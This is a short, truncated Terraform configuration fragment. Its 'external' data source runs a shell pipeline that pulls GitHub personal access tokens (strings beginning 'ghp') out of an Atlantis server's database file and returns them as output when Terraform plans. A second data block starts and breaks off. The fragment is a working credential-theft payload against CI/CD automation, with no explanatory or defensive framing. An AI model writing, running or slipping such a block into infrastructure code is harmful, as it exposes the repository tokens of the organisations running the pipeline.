data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | awk '{print $0\",\"}' | xargs -0 printf '{ %s }'"]
}
data "local_file" "foo" {
    filename = "${path.module}/foo.bar"
